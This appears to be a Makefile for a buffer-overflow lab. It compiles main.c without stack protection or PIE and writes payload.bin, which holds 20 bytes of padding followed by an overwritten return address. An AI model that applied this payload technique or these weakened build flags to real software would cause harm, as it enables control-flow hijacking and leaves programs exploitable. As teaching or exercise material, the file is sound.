CC = gcc
CFLAGS = -Wall -Wextra -fno-stack-protector -no-pie -g
TARGET = main
PAYLOAD_FILE = payload.bin

TARGET_ADDR = \xd8\x11\x40\x00\x00\x00\x00\x00
OFFSET = AAAAAAAAAAAAAAAAAAAA

all: $(TARGET)

$(TARGET): main.c
	$(CC) $(CFLAGS) main.c -o $(TARGET)

payload:
	/usr/bin/printf "$(OFFSET)$(TARGET_ADDR)" > $(PAYLOAD_FILE)

run: $(TARGET)
	./$(TARGET)

clean:
	rm -f $(TARGET)